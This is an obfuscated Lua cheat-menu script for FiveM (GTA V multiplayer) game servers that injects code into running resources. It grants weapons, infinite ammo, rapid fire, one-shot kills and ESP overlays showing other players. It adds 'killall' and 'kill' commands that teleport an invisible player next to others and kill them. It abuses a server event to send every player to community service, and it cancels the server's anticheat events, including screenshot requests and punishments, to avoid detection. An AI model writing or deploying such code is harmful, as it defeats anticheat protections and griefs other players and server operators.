v180("WEAPON_CROWBAR",1 + 0 );end);MachoMenuButton(v178,"Golf Club",function() v180("WEAPON_GOLFCLUB",1 -0 );end);MachoMenuButton(v178,"Machete",function() v180("WEAPON_MACHETE",1 -0 );end);MachoMenuButton(v178,"Switchblade",function() v180("WEAPON_SWITCHBLADE",1);end);MachoMenuButton(v178,"Dagger",function() v180("WEAPON_DAGGER",1679 -(136 + 1542) );end);MachoMenuButton(v178,"Hatchet",function() v180("WEAPON_HATCHET",1);end);MachoMenuButton(v178,"Wrench",function() v180("WEAPON_WRENCH",1);end);MachoMenuButton(v178,"Nightstick",function() v180("WEAPON_NIGHTSTICK",3 -2 );end);MachoMenuButton(v178,"Bottle",function() v180("WEAPON_BOTTLE",1 + 0 );end);MachoMenuText(v178,"PISTOLS");MachoMenuButton(v178,"Pistol",function() v180("WEAPON_PISTOL");end);MachoMenuButton(v178,"Pistol MK2",function() v180("WEAPON_PISTOL_MK2");end);MachoMenuButton(v178,"Combat Pistol",function() v180("WEAPON_COMBATPISTOL");end);MachoMenuButton(v178,"AP Pistol",function() v180("WEAPON_APPISTOL");end);MachoMenuButton(v178,"Pistol 50",function() v180("WEAPON_PISTOL50");end);MachoMenuButton(v178,"Heavy Pistol",function() v180("WEAPON_HEAVYPISTOL");end);MachoMenuButton(v178,"SNS Pistol",function() v180("WEAPON_SNSPISTOL");end);MachoMenuButton(v178,"Vintage Pistol",function() v180("WEAPON_VINTAGEPISTOL");end);MachoMenuButton(v178,"Ceramic Pistol",function() v180("WEAPON_CERAMICPISTOL");end);MachoMenuButton(v178,"Flare Gun",function() v180("WEAPON_FLAREGUN");end);MachoMenuButton(v178,"Stun Gun (Taser)",function() v180("WEAPON_STUNGUN");end);MachoMenuButton(v178,"Revolver",function() v180("WEAPON_REVOLVER");end);MachoMenuButton(v178,"Double Action Revolver",function() v180("WEAPON_DOUBLEACTION");end);MachoMenuButton(v178,"Marksman Pistol",function() v180("WEAPON_MARKSMANPISTOL");end);MachoMenuText(v178,"SMGs");MachoMenuButton(v178,"SMG",function() v180("WEAPON_SMG");end);MachoMenuButton(v178,"SMG MK2",function() v180("WEAPON_SMG_MK2");end);MachoMenuButton(v178,"Micro SMG",function() v180("WEAPON_MICROSMG");end);MachoMenuButton(v178,"Assault SMG",function() v180("WEAPON_ASSAULTSMG");end);MachoMenuButton(v178,"Combat PDW",function() v180("WEAPON_COMBATPDW");end);MachoMenuButton(v178,"Machine Pistol",function() v180("WEAPON_MACHINEPISTOL");end);MachoMenuButton(v178,"Mini SMG",function() v180("WEAPON_MINISMG");end);MachoMenuButton(v178,"Gusenberg Sweeper",function() v180("WEAPON_GUSENBERG");end);MachoMenuText(v178,"SHOTGUNS");MachoMenuButton(v178,"Pump Shotgun",function() v180("WEAPON_PUMPSHOTGUN");end);MachoMenuButton(v178,"Pump Shotgun MK2",function() v180("WEAPON_PUMPSHOTGUN_MK2");end);MachoMenuButton(v178,"Sawed Off Shotgun",function() v180("WEAPON_SAWNOFFSHOTGUN");end);MachoMenuButton(v178,"Assault Shotgun",function() v180("WEAPON_ASSAULTSHOTGUN");end);MachoMenuButton(v178,"Bullpup Shotgun",function() v180("WEAPON_BULLPUPSHOTGUN");end);MachoMenuButton(v178,"Heavy Shotgun",function() v180("WEAPON_HEAVYSHOTGUN");end);MachoMenuButton(v178,"Double Barrel Shotgun",function() v180("WEAPON_DBSHOTGUN");end);MachoMenuButton(v178,"Sweeper Shotgun",function() v180("WEAPON_AUTOSHOTGUN");end);MachoMenuText(v178,"RIFLES");MachoMenuButton(v178,"Assault Rifle",function() v180("WEAPON_ASSAULTRIFLE");end);MachoMenuButton(v178,"Assault Rifle MK2",function() v180("WEAPON_ASSAULTRIFLE_MK2");end);MachoMenuButton(v178,"Carbine Rifle",function() v180("WEAPON_CARBINERIFLE");end);MachoMenuButton(v178,"Carbine Rifle MK2",function() v180("WEAPON_CARBINERIFLE_MK2");end);MachoMenuButton(v178,"Advanced Rifle",function() v180("WEAPON_ADVANCEDRIFLE");end);MachoMenuButton(v178,"Special Carbine",function() v180("WEAPON_SPECIALCARBINE");end);MachoMenuButton(v178,"Special Carbine MK2",function() v180("WEAPON_SPECIALCARBINE_MK2");end);MachoMenuButton(v178,"Bullpup Rifle",function() v180("WEAPON_BULLPUPRIFLE");end);MachoMenuButton(v178,"Bullpup Rifle MK2",function() v180("WEAPON_BULLPUPRIFLE_MK2");end);MachoMenuButton(v178,"Compact Rifle",function() v180("WEAPON_COMPACTRIFLE");end);MachoMenuButton(v178,"Military Rifle",function() v180("WEAPON_MILITARYRIFLE");end);MachoMenuButton(v178,"Heavy Rifle",function() v180("WEAPON_HEAVYRIFLE");end);MachoMenuButton(v178,"Battle Rifle",function() v180("WEAPON_BATTLERIFLE");end);MachoMenuButton(v178,"Tactical Rifle",function() v180("WEAPON_TACTICALRIFLE");end);MachoMenuButton(v178,"MG",function() v180("WEAPON_MG");end);MachoMenuButton(v178,"Combat MG",function() v180("WEAPON_COMBATMG");end);MachoMenuButton(v178,"Combat MG MK2",function() v180("WEAPON_COMBATMG_MK2");end);MachoMenuText(v178,"SNIPERS");MachoMenuButton(v178,"Sniper Rifle",function() v180("WEAPON_SNIPERRIFLE");end);MachoMenuButton(v178,"Heavy Sniper",function() v180("WEAPON_HEAVYSNIPER");end);MachoMenuButton(v178,"Heavy Sniper MK2",function() v180("WEAPON_HEAVYSNIPER_MK2");end);MachoMenuButton(v178,"Marksman Rifle",function() v180("WEAPON_MARKSMANRIFLE");end);MachoMenuButton(v178,"Marksman Rifle MK2",function() v180("WEAPON_MARKSMANRIFLE_MK2");end);MachoMenuText(v178,"HEAVY WEAPONS");MachoMenuButton(v178,"RPG",function() v180("WEAPON_RPG",79 -29 );end);MachoMenuButton(v178,"Minigun",function() v180("WEAPON_MINIGUN",362 + 138 );end);MachoMenuButton(v178,"Grenade Launcher",function() v180("WEAPON_GRENADELAUNCHER",536 -(68 + 418) );end);MachoMenuButton(v178,"Compact Grenade Launcher",function() v180("WEAPON_COMPACTLAUNCHER",135 -85 );end);MachoMenuButton(v178,"Homing Launcher",function() v180("WEAPON_HOMINGLAUNCHER",50);end);MachoMenuButton(v178,"Railgun",function() v180("WEAPON_RAILGUN",90 -40 );end);MachoMenuButton(v178,"Firework Launcher",function() v180("WEAPON_FIREWORK",50);end);MachoMenuButton(v178,"Up-n-Atomizer",function() v180("WEAPON_RAYGUN",50);end);MachoMenuButton(v178,"Hellbringer",function() v180("WEAPON_RAYMINIGUN",500);end);MachoMenuButton(v178,"Widowmaker",function() v180("WEAPON_RAYCARBINE",500);end);MachoMenuText(v178,"THROWABLES");MachoMenuButton(v178,"Grenade",function() v180("WEAPON_GRENADE",9 + 1 );end);MachoMenuButton(v178,"Sticky Bomb",function() v180("WEAPON_STICKYBOMB",1102 -(770 + 322) );end);MachoMenuButton(v178,"Molotov Cocktail",function() v180("WEAPON_MOLOTOV",1 + 9 );end);MachoMenuButton(v178,"Pipe Bomb",function() v180("WEAPON_PIPEBOMB",10);end);MachoMenuButton(v178,"Smoke Grenade",function() v180("WEAPON_SMOKEGRENADE",3 + 7 );end);MachoMenuButton(v178,"Proximity Mine",function() v180("WEAPON_PROXMINE",2 + 8 );end);MachoMenuButton(v178,"BZ Gas",function() v180("WEAPON_BZGAS",10);end);MachoMenuText(v178,"TOGGLES");local v181=MachoMenuSlider(v178,"Ammo Quantity",v179,1 -0 ,9999,"rds",19 -9 ,function(v462) v179=v462;end);local v182=false;MachoMenuCheckbox(v178,"Infinite Ammo",function() local v463=0;while true do if (v463==0) then v182=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        infiniteAmmoActive = true
        CreateThread(function()
            while infiniteAmmoActive do
                Wait(0)
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedAmmo(ped, weapon, 9999)
                    SetPedInfiniteAmmo(ped, true, weapon)
                    SetPedInfiniteAmmoClip(ped, true)
                end
            end
        end)
    ]]);v463=1;end if (v463==(2 -1)) then MachoMenuNotification("Ammo","Infinite Ammo ON");break;end end end,function() local v464=0 -0 ;while true do if (v464==(1 + 0)) then MachoMenuNotification("Ammo","Infinite Ammo OFF");break;end if (v464==0) then v182=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        infiniteAmmoActive = false
        local ped = PlayerPedId()
        local weapon = GetSelectedPedWeapon(ped)
        if weapon ~= nil and weapon ~= 0 then
            SetPedInfiniteAmmo(ped, false, weapon)
            SetPedInfiniteAmmoClip(ped, false)
        end
    ]]);v464=1;end end end);local v183=false;MachoMenuCheckbox(v178,"No Recoil",function() v183=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        noRecoilActive = true
        CreateThread(function()
            while noRecoilActive do
                Wait(0)
                local cam = GetRenderingCam()
                StopGameplayCamShaking(true)
                if cam ~= 0 then
                    StopCamShaking(cam, true)
                end
                SetPedWeaponRecoilModifier(PlayerPedId(), 0.0)
                SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 0.0)
                SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
            end
        end)
    ]]);MachoMenuNotification("Recoil","No Recoil ON");end,function() local v465=0 -0 ;while true do if (0==v465) then v183=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        noRecoilActive = false
        SetPedWeaponRecoilModifier(PlayerPedId(), 1.0)
        SetPedWeaponRecoilShakeMultiplier(PlayerPedId(), 1.0)
        StopGameplayCamShaking(false)
    ]]);v465=1 + 0 ;end if (v465==(1 + 0)) then MachoMenuNotification("Recoil","No Recoil OFF");break;end end end);local v184=false;MachoMenuCheckbox(v178,"No Reload",function() local v466=0 + 0 ;while true do if (v466==1) then MachoMenuNotification("Reload","No Reload ON");break;end if (v466==(0 -0)) then v184=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        noReloadActive = true
        CreateThread(function()
            while noReloadActive do
                Wait(0)
                RefillAmmoInstantly(PlayerPedId())
            end
        end)
    ]]);v466=1 -0 ;end end end,function() local v467=0 + 0 ;while true do if (v467==(4 -3)) then MachoMenuNotification("Reload","No Reload OFF");break;end if (v467==(0 -0)) then v184=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        noReloadActive = false
    ]]);v467=1;end end end);local v185=false;MachoMenuCheckbox(v178,"No Spread",function() v185=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        noSpreadActive = true
        CreateThread(function()
            while noSpreadActive do
                Wait(0)
                SetPedAccuracy(PlayerPedId(), 100)
                SetPedWeaponAccuracyMultiplier(PlayerPedId(), 100.0)
                SetPedWeaponAccuracyModifier(PlayerPedId(), 100.0)
            end
        end)
    ]]);MachoMenuNotification("Spread","No Spread ON");end,function() v185=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        noSpreadActive = false
        SetPedAccuracy(PlayerPedId(), 50)
        SetPedWeaponAccuracyMultiplier(PlayerPedId(), 1.0)
    ]]);MachoMenuNotification("Spread","No Spread OFF");end);local v186=false;MachoMenuCheckbox(v178,"Rapid Fire",function() v186=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        rapidFireActive = true
        CreateThread(function()
            while rapidFireActive do
                Wait(0)
                DisablePlayerFiring(PlayerPedId(), true)
                if IsDisabledControlPressed(0, 24) then
                    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local rad = 0.01745329
                    local rx = camRot.x * rad
                    local rz = camRot.z * rad
                    local fdx = -math.sin(rz) * math.cos(rx)
                    local fdy = math.cos(rz) * math.cos(rx)
                    local fdz = math.sin(rx)
                    local tx = camPos.x + fdx * 200
                    local ty = camPos.y + fdy * 200
                    local tz = camPos.z + fdz * 200
                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, tx, ty, tz, 5, true, weapon, PlayerPedId(), true, true, 24000.0)
                end
            end
        end)
    ]]);MachoMenuNotification("Rapid Fire","Rapid Fire ON");end,function() local v468=0 + 0 ;while true do if (v468==(0 -0)) then v186=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        rapidFireActive = false
    ]]);v468=832 -(762 + 69) ;end if (v468==1) then MachoMenuNotification("Rapid Fire","Rapid Fire OFF");break;end end end);local v187=false;MachoMenuCheckbox(v178,"One Shot Kill",function() v187=true;SetPlayerWeaponDamageModifier(PlayerId(),32377 -22378 );MachoMenuNotification("One Shot","One Shot Kill ON");end,function() v187=false;SetPlayerWeaponDamageModifier(PlayerId(),1 + 0 );MachoMenuNotification("One Shot","One Shot Kill OFF");end);MachoMenuButton(v178,"Remove All Weapons",function() RemoveAllPedWeapons(PlayerPedId(),true);MachoMenuNotification("Weapons","All weapons removed!");end);MachoMenuButton(v178,"Refill Ammo",function() local v469=0 + 0 ;local v470;local v471;while true do if (0==v469) then v470=PlayerPedId();v471=GetSelectedPedWeapon(v470);v469=2 -1 ;end if ((1 + 0)==v469) then if ((v471~=nil) and (v471~=(0 + 0)) and (v471~=GetHashKey("WEAPON_UNARMED"))) then SetPedAmmo(v470,v471,38957 -28958 );MachoMenuNotification("Ammo","Ammo refilled!");else MachoMenuNotification("Error","No weapon equipped!");end break;end end end);local v188=false;MachoMenuCheckbox(v178,"Weapon RGB",function() v188=true;local v472={1320 -(1199 + 121) ,2 -1 ,1 + 1 ,6 -3 ,4 + 0 ,8 -3 ,6,10 -3 };local v473=1 + 0 ;MachoInjectResource2(NewThreadNs,"monitor",[[
        weaponRGBActive = true
        local tints = {0, 1, 2, 3, 4, 5, 6, 7}
        local index = 1
        CreateThread(function()
            while weaponRGBActive do
                Wait(125)
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedWeaponTintIndex(ped, weapon, tints[index])
                    index = index + 1
                    if index > #tints then index = 1 end
                end
            end
        end)
    ]]);MachoMenuNotification("Weapon","Weapon RGB ON");end,function() local v474=0;while true do if (v474==(469 -(304 + 165))) then v188=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        weaponRGBActive = false
    ]]);v474=1 + 0 ;end if (v474==(161 -(54 + 106))) then MachoMenuNotification("Weapon","Weapon RGB OFF");break;end end end);print("[Weapons] Tab loaded!");local v189=MachoMenuAddTab(v4,"ESP Menu");local v190=MachoMenuGroup(v189,"ESP Menu",v3,1978 -(1618 + 351) ,(v1.x-v3) + 106 + 44 ,v1.y);MachoMenuCheckbox(v190,"ESP",function() MachoInjectResource("any",[[
        local espActive = true
        CreateThread(function()
            while espActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local targetPed = GetPlayerPed(i)
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(myCoords - targetCoords)

                        if distance < 130.0 then
                            local name = GetPlayerName(i)
                            local serverId = GetPlayerServerId(i)
                            local text = serverId .. " | " .. name

                            if NetworkIsPlayerTalking(i) then
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, text, 255, 100, 100)
                            else
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, text, 255, 255, 255)
                            end

                            if IsPedInAnyVehicle(targetPed, false) then
                                local veh = GetVehiclePedIsUsing(targetPed)
                                local model = GetEntityModel(veh)
                                local vehName = GetLabelText(GetDisplayNameFromVehicleModel(model))
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "Vehicle: " .. vehName, 180, 180, 180)
                            end
                        end
                    end
                end

                Wait(0)
            end
        end)

        function DrawText3D(x, y, z, text, r, g, b)
            SetTextScale(0.35, 0.35)
            SetTextFont(4)
            SetTextProportional(1)
            SetTextColour(r, g, b, 215)
            SetTextEntry("STRING")
            SetTextCentre(true)
            AddTextComponentString(text)
            SetDrawOrigin(x, y, z, 0)
            DrawText(0.0, 0.0)
            ClearDrawOrigin()
        end
    ]]);end,function() MachoInjectResource("any",[[
        espActive = false
    ]]);end);MachoMenuCheckbox(v190,"ESP Box",function() MachoInjectResource("any",[[
        espBoxActive = true
        CreateThread(function()
            while espBoxActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local ra = { r = 255, g = 0, b = 0 }

                        local LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        local LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        local LineTwoBegin = LineOneEnd
                        local LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        local LineThreeBegin = LineTwoEnd
                        local LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        local LineFourBegin = LineThreeEnd
                        local LineFourEnd = LineOneBegin

                        local TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        local TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        local TLineTwoBegin = TLineOneEnd
                        local TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        local TLineThreeBegin = TLineTwoEnd
                        local TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        local TLineFourBegin = TLineThreeEnd
                        local TLineFourEnd = LineOneBegin

                        local ConnectorOneBegin = TLineThreeEnd
                        local ConnectorOneEnd = LineThreeEnd
                        local ConnectorTwoBegin = TLineTwoEnd
                        local ConnectorTwoEnd = LineTwoEnd
                        local ConnectorThreeBegin = TLineOneBegin
                        local ConnectorThreeEnd = LineOneBegin
                        local ConnectorFourBegin = TLineOneEnd
                        local ConnectorFourEnd = LineOneEnd

                        local lines = {
                            {LineOneBegin, LineOneEnd}, {LineTwoBegin, LineTwoEnd},
                            {LineThreeBegin, LineThreeEnd}, {LineFourBegin, LineFourEnd},
                            {TLineOneBegin, TLineOneEnd}, {TLineTwoBegin, TLineTwoEnd},
                            {TLineThreeBegin, TLineThreeEnd}, {TLineFourBegin, TLineFourEnd},
                            {ConnectorOneBegin, ConnectorOneEnd}, {ConnectorTwoBegin, ConnectorTwoEnd},
                            {ConnectorThreeBegin, ConnectorThreeEnd}, {ConnectorFourBegin, ConnectorFourEnd}
                        }

                        for _, line in pairs(lines) do
                            DrawLine(line[1].x, line[1].y, line[1].z, line[2].x, line[2].y, line[2].z, ra.r, ra.g, ra.b, 255)
                        end
                    end
                end

                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("any",[[
        espBoxActive = false
    ]]);end);MachoMenuCheckbox(v190,"Detail ESP Info",function() MachoInjectResource("any",[[
        espInfoActive = true
        CreateThread(function()
            while espInfoActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local cx, cy, cz = table.unpack(myCoords)
                        local distance = #(myCoords - vector3(x, y, z))
                        
                        local message = string.format("Name: %s\nPlayer ID: %d\nDist: %.1f",
                            GetPlayerName(i),
                            GetPlayerServerId(i),
                            i,
                            distance
                        )

                        if IsPedInAnyVehicle(pPed, true) then
                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                            message = message .. "\nVeh: " .. VehName
                        end

                        local r, g, b = 255, 255, 255
                        if NetworkIsPlayerTalking(i) then
                            r, g, b = 0, 255, 0
                        end

                        DrawText3D(x, y, z + 1.0, message, r, g, b)
                    end
                end
                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("any",[[
        espInfoActive = false
    ]]);end);MachoMenuCheckbox(v190,"ESP Lines",function() MachoInjectResource("any",[[
        espLinesEnabled = true
        CreateThread(function()
            while espLinesEnabled do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local px, py, pz = table.unpack(GetEntityCoords(pPed))

                        local ra = { r = 255, g = 0, b = 0 }
                        DrawLine(myCoords.x, myCoords.y, myCoords.z, px, py, pz, ra.r, ra.g, ra.b, 255)
                    end
                end

                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("any",[[
        espLinesEnabled = false
    ]]);end);local v191=false;MachoMenuCheckbox(v190,"DOT Crosshair",function() local v475=1016 -(10 + 1006) ;while true do if (v475==0) then crosshair=false;crosshairc=false;v475=1;end if (v475==1) then v191=true;CreateThread(function() while v191 do local v862=0 + 0 ;while true do if (0==v862) then Citizen.Wait(0 + 0 );DrawTxt("~r~.",0.4968 -0 ,1033.478 -(912 + 121) );break;end end end end);break;end end end,function() v191=false;end);function DrawTxt(v476,v477,v478) SetTextFont(2 + 2 );SetTextProportional(1);SetTextScale(1289 -(1140 + 149) ,0.5);SetTextColour(164 + 91 ,0,0 -0 ,48 + 207 );SetTextDropshadow(0 -0 ,0 -0 ,0 + 0 ,0,884 -629 );SetTextEdge(1,186 -(165 + 21) ,0,0,366 -(61 + 50) );SetTextDropShadow();SetTextOutline();SetTextEntry("STRING");AddTextComponentString(v476);DrawText(v477,v478);end MachoInjectResource("any",[[
-- Kill all
RegisterCommand("killall", function()
    local playerPed = PlayerPedId()
    local oldCoords = GetEntityCoords(playerPed)

    -- Make invisible
    SetEntityVisible(playerPed, false, false)

    -- Spawn weapon
    GiveWeaponToPed(playerPed, GetHashKey("WEAPON_APPISTOL"), 9999, false, true)
    SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_APPISTOL"), true)
    SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_APPISTOL"))
    SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

    Citizen.CreateThread(function()
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)

            if targetPed ~= playerPed and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(targetCoords - oldCoords)

                if distance <= 500.0 then
                    -- Teleport next to them
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

                    -- Deal damage + bullet effect
                    for i = 1, 5 do
                        ApplyDamageToPed(targetPed, 200, false)
                        ShootSingleBulletBetweenCoords(
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.1,
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.2,
                            250,
                            0,
                            GetHashKey("WEAPON_APPISTOL"),
                            playerPed,
                            true,
                            false,
                            -1.0
                        )
                        Citizen.Wait(50)
                    end

                    Citizen.Wait(150)
                end
            end
        end

        -- Cleanup
        RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_APPISTOL"))
        SetEntityVisible(playerPed, true, false)
        SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
    end)
end)
]]);MachoInjectResource("monitor",[[
    RegisterNetEvent('Anticheat:CheckJumping')
    AddEventHandler('Anticheat:CheckJumping', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:punishFromClient')
    AddEventHandler('Anticheat:punishFromClient', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:peerInitialized')
    AddEventHandler('Anticheat:peerInitialized', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:requestIntialization')
    AddEventHandler('Anticheat:requestIntialization', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:requestClientScreenshot')
    AddEventHandler('Anticheat:requestClientScreenshot', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:peerInitialized')
    AddEventHandler('Anticheat:peerInitialized', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:nuiEvent')
    AddEventHandler('Anticheat:nuiEvent', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:pong')
    AddEventHandler('Anticheat:pong', function()
       CancelEvent()
    end)
]]);RegisterCommand("herkesekamu",function(v479,v480,v481) local v482=PlayerPedId();local v483=GetEntityCoords(v482);local v484=0;for v518,v519 in ipairs(GetActivePlayers()) do local v520=0;local v521;while true do if ((0 + 0)==v520) then v521=GetPlayerPed(v519);if (v521~=v482) then local v919=0 -0 ;local v920;local v921;local v922;while true do if (v919==(3 -1)) then v484=v484 + 1 + 0 ;Citizen.Wait(4510 -(1295 + 165) );break;end if (v919==(1 + 0)) then v922=GetPlayerServerId(v519);TriggerServerEvent("qb-communityservice:sendToCommunityService",v922,0 + 0 );v919=2;end if (v919==(1397 -(819 + 578))) then v920=GetEntityCoords(v521);v921= #(v483-v920);v919=1;end end end break;end end end if (v484>(1402 -(331 + 1071))) then TriggerEvent("chat:addMessage",{color={0,2192 -(1834 + 103) ,0},multiline=true,args={"System",v484   .. " FIX" }});else TriggerEvent("chat:addMessage",{color={746 -(128 + 363) ,0,0 + 0 },multiline=true,args={"System","no ren!"}});end end,false);RegisterCommand("kamu",function(v485,v486,v487) local v488=0 -0 ;local v489;local v490;while true do if (v488==(0 + 0)) then v489=tonumber(v486[1010 -(615 + 394) ]);v490=GetPlayerServerId(v489);v488=1;end if (1==v488) then TriggerServerEvent("qb-communityservice:sendToCommunityService",v489,22);TriggerEvent("chat:addMessage",{color={0 + 0 ,1156 -901 ,651 -(59 + 592) },multiline=true,args={"System",v489   .. " id's player is Kamu mode" }});break;end end end,false);MachoInjectResource("any",[[
RegisterCommand("kill", function(source, args)
    local targetId = tonumber(args[1])
    if not targetId then return end

    local playerPed = PlayerPedId()
    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetId))

    if targetPed ~= 0 and DoesEntityExist(targetPed) then
        -- Save old coordinates
        local oldCoords = GetEntityCoords(playerPed)

        -- Teleport next to target
        local targetCoords = GetEntityCoords(targetPed)
        SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

        -- Spawn weapon (local only, server doesn't see)
        GiveWeaponToPed(playerPed, GetHashKey("WEAPON_APPISTOL"), 250, false, true)
        SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_APPISTOL"), true)
        SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_APPISTOL"))

        -- Make weapon invisible
        SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

        -- Silent kill
        Citizen.CreateThread(function()
            local coords = GetEntityCoords(targetPed)
            for i = 1, 5 do
                ApplyDamageToPed(targetPed, 200, false)
                ShootSingleBulletBetweenCoords(
                    coords.x, coords.y, coords.z + 0.1,
                    coords.x, coords.y, coords.z + 0.2,
                    250,
                    0,
                    GetHashKey("WEAPON_APPISTOL"),
                    playerPed,
                    true,
                    false,
                    -1.0
                )
                Citizen.Wait(50)
            end
        end)

        -- Remove weapon and return to old position
        Citizen.SetTimeout(2000, function()
            RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_APPISTOL"))
            SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
        end)
    end
end)
]]);
